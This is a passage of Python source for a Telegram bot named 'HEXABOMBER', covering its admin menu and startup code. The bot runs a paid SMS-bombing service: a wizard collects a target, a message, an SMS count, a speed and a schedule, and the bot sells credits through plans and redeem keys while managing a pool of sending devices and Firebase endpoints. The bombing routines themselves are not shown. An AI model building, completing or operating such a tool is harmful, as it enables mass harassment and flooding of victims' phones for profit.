        await update.message.reply_text(f"🔑 {B('GENERATE KEY')}\n{LINE}\n{B('Format')}: `CODE MAXUSER CREDIT`\n{B('Example')}: `HEXA50 5 100`",
                                         reply_markup=get_admin_panel_keyboard())
    elif text == f"➕ {B('ADD FIREBASE')}" and user_id in ADMIN_IDS:
        await update.message.reply_text(f"➕ {B('Use /addfb <url>')}", reply_markup=get_admin_panel_keyboard())
    elif text == f"⚙️ {B('MANAGE FIREBASES')}" and user_id in ADMIN_IDS:
        firebases = db_get_firebases()
        out = f"⚙️ {B('MANAGE FIREBASES')}\n{LINE}\n\n"
        if not firebases: out += f"{B('No Firebase.')}\n"
        else:
            for fid, d in firebases.items(): out += f"• {B(fid)}: {B(d['url'])}\n"
        out += f"\n{B('Use /addfb or /deletefb <id>')}"
        await update.message.reply_text(out, reply_markup=get_admin_panel_keyboard())
    elif text == f"📡 {B('ONLINE DEVICES')}" and user_id in ADMIN_IDS:
        await show_devices_from_message(update)
    elif text == f"✉️ {B('MESSAGE USER')}" and user_id in ADMIN_IDS:
        context.user_data["admin_state"] = "message_user"
        await update.message.reply_text(f"✉️ {B('MESSAGE USER')}\n{LINE}\n{B('Send ID then message on new line.')}",
                                         reply_markup=get_admin_panel_keyboard())
    elif text == f"🔍 {B('CHECK USER')}" and user_id in ADMIN_IDS:
        context.user_data["admin_state"] = "check_user"
        await update.message.reply_text(f"🔍 {B('CHECK USER')}\n{B('Send User ID.')}", reply_markup=get_admin_panel_keyboard())
    elif text == f"🚫 {B('SUSPEND')}" and user_id in ADMIN_IDS:
        context.user_data["admin_state"] = "suspend"
        await update.message.reply_text(f"🚫 {B('SUSPEND')}\n{B('Send User ID.')}", reply_markup=get_admin_panel_keyboard())
    elif text == f"✅ {B('UNSUSPEND')}" and user_id in ADMIN_IDS:
        context.user_data["admin_state"] = "unsuspend"
        await update.message.reply_text(f"✅ {B('UNSUSPEND')}\n{B('Send User ID.')}", reply_markup=get_admin_panel_keyboard())
    elif text == f"🔗 {B('FORCE CHANNEL')}" and user_id in ADMIN_IDS:
        context.user_data["admin_state"] = "force_channel"
        await update.message.reply_text(f"🔗 {B('SET FORCE CHANNEL')}\n{B('Send channel without @.')}", reply_markup=get_admin_panel_keyboard())
    elif text == f"❌ {B('REMOVE FORCE SUB')}" and user_id in ADMIN_IDS:
        cur = get_force_channel(); remove_force_channel()
        await update.message.reply_text(f"✅ {B('REMOVED')}" + (f" @{B(cur)}" if cur else ""), reply_markup=get_admin_panel_keyboard())
    elif text == f"📊 {B('VAST STATS')}" and user_id in ADMIN_IDS:
        await show_vast_stats(update, context)
    elif text == f"🔧 {B('MAINTENANCE')}" and user_id in ADMIN_IDS:
        ns = toggle_maintenance()
        st = "🔴 ON" if ns else "🟢 OFF"
        await update.message.reply_text(f"🔧 {B('MAINTENANCE')}: {B(st)}", reply_markup=get_admin_panel_keyboard())
    elif text == f"✅ {B('REMOVE MAINTENANCE')}" and user_id in ADMIN_IDS:
        set_maintenance(False)
        await update.message.reply_text(f"✅ {B('MAINTENANCE OFF')}", reply_markup=get_admin_panel_keyboard())
    elif text == f"🎬 {B('SET DEMO')}" and user_id in ADMIN_IDS:
        context.user_data["admin_state"] = "set_demo"
        await update.message.reply_text(f"🎬 {B('Send a video.')}", reply_markup=get_admin_panel_keyboard())
    elif text == f"❌ {B('REMOVE DEMO')}" and user_id in ADMIN_IDS:
        remove_demo_video()
        await update.message.reply_text(f"✅ {B('DEMO REMOVED')}", reply_markup=get_admin_panel_keyboard())
    elif text == f"🖼 {B('SET QR')}" and user_id in ADMIN_IDS:
        context.user_data["admin_state"] = "set_qr"
        await update.message.reply_text(f"🖼 {B('Send QR photo.')}", reply_markup=get_admin_panel_keyboard())
    elif text == f"❌ {B('REMOVE QR')}" and user_id in ADMIN_IDS:
        remove_qr_photo()
        await update.message.reply_text(f"✅ {B('QR REMOVED')}", reply_markup=get_admin_panel_keyboard())
    elif text == f"➕ {B('ADD CREDIT')}" and user_id in ADMIN_IDS:
        context.user_data["admin_state"] = "add_credit"
        await update.message.reply_text(f"➕ {B('Format')}: USER_ID CREDIT\n{B('Example')}: 123456789 100", reply_markup=get_admin_panel_keyboard())
    elif text == f"➖ {B('REMOVE CREDIT')}" and user_id in ADMIN_IDS:
        context.user_data["admin_state"] = "remove_credit"
        await update.message.reply_text(f"➖ {B('Format')}: USER_ID CREDIT\n{B('Example')}: 123456789 50", reply_markup=get_admin_panel_keyboard())
    elif text == f"✅ {B('ADD PLAN')}" and user_id in ADMIN_IDS:
        context.user_data["admin_state"] = "add_plan"
        await update.message.reply_text(f"✅ {B('Format')}: Name,Price,Credit\n{B('Example')}: Starter,20,50", reply_markup=get_admin_panel_keyboard())
    elif text == f"📝 {B('EDIT PLAN')}" and user_id in ADMIN_IDS:
        plans = db_get_plans()
        out = f"📝 {B('EDIT PLAN')}\n{LINE}\n{B('Format')}: OldName,NewName,Price,Credit\n\n"
        for p in plans:
            out += f"• {B(p['name'])} - ₹{B(str(p['price']))} ({B(str(p['credits']))} credits)\n"
        context.user_data["admin_state"] = "edit_plan"
        await update.message.reply_text(out, reply_markup=get_admin_panel_keyboard())
    elif text == f"🗑 {B('DELETE PLAN')}" and user_id in ADMIN_IDS:
        plans = db_get_plans()
        out = f"🗑 {B('DELETE PLAN')}\n{LINE}\n{B('Send Plan Name.')}\n\n"
        for p in plans:
            out += f"• {B(p['name'])}\n"
        context.user_data["admin_state"] = "delete_plan"
        await update.message.reply_text(out, reply_markup=get_admin_panel_keyboard())
    elif text == f"🆘 {B('ADD SUPPORT')}" and user_id in ADMIN_IDS:
        cur = get_support_username()
        context.user_data["admin_state"] = "set_support"
        await update.message.reply_text(f"🆘 {B('ADD SUPPORT')}\n{B('Current')}: @{B(cur)}\n{B('Send new username (without @).')}",
                                         reply_markup=get_admin_panel_keyboard())
    elif text == f"❌ {B('REMOVE SUPPORT')}" and user_id in ADMIN_IDS:
        remove_support_username()
        await update.message.reply_text(f"✅ {B('SUPPORT REMOVED. Default')}: @{B(DEFAULT_SUPPORT)}", reply_markup=get_admin_panel_keyboard())
    elif text == f"📢 {B('BROADCAST')}" and user_id in ADMIN_IDS:
        context.user_data["admin_state"] = "broadcast"
        await update.message.reply_text(f"📢 {B('BROADCAST')}\n{B('Send text, photo, or video.')}", reply_markup=get_admin_panel_keyboard())
    elif text == f"🗑 {B('CLEAR DB')}" and user_id in ADMIN_IDS:
        context.user_data["admin_state"] = "clear_db"
        await update.message.reply_text(f"⚠️ {B('Type YES to clear ALL!')}", reply_markup=get_admin_panel_keyboard())
    elif text == f"⬅️ {B('BACK TO MAIN MENU')}":
        await update.message.reply_text(f"🔙 {B('Back')}", reply_markup=get_main_keyboard(user_id))

# ============================================================
# MAIN
# ============================================================
def main():
    global BOT
    try:
        app = Application.builder().token(TOKEN).concurrent_updates(True).build()
        BOT = app.bot
        set_bot(BOT)

        conv = ConversationHandler(
            entry_points=[
                CallbackQueryHandler(bomb_wizard_start, pattern="^bomb_wizard$"),
                CommandHandler("bomb", bomb_wizard_start),
                MessageHandler(filters.Regex(f'^💣 {re.escape(B("LAUNCH BOMB"))}$'), bomb_wizard_start),
            ],
            states={
                TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_target)],
                MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_message)],
                SMS_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_sms_count)],
                SPEED: [CallbackQueryHandler(bomb_speed, pattern="^speed_(slow|medium|fast|lightning)$")],
                SCHEDULE: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_schedule)],
            },
            fallbacks=[CommandHandler("cancel", cancel_conversation)],
            allow_reentry=True,
        )
        app.add_handler(conv)
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, button_handler))
        app.add_handler(MessageHandler(filters.PHOTO, button_handler))
        app.add_handler(MessageHandler(filters.VIDEO, button_handler))

        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("ping", ping))
        app.add_handler(CommandHandler("redeem", redeem_command))
        app.add_handler(CommandHandler("cancel", cancel_job_command))
        app.add_handler(CommandHandler("addfb", add_firebase_command))
        app.add_handler(CommandHandler("deletefb", delete_firebase_command))
        app.add_handler(CommandHandler("addkey", addkey_command))
        app.add_handler(CommandHandler("broadcast", broadcast_command))

        app.add_handler(CallbackQueryHandler(callback_handler,
            pattern="^(balance|check_join|show_plans|back_to_plans|plan_\\d+|done_upload\\|.+|apv\\|.+|dcl\\|.+|back_main|redeem_key|gen_key|devices|manage_fb|add_fb|fb_delete_.+|fb_test_.+)$"))
        app.add_handler(CallbackQueryHandler(bomb_wizard_start, pattern="^bomb_wizard$"))

        logger.info("HEXABOMBER Bot started (MongoDB)")
        app.run_polling(drop_pending_updates=True)

    except Exception as e:
        logger.error(f"Failed: {e}")
        print(f"\nERROR: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()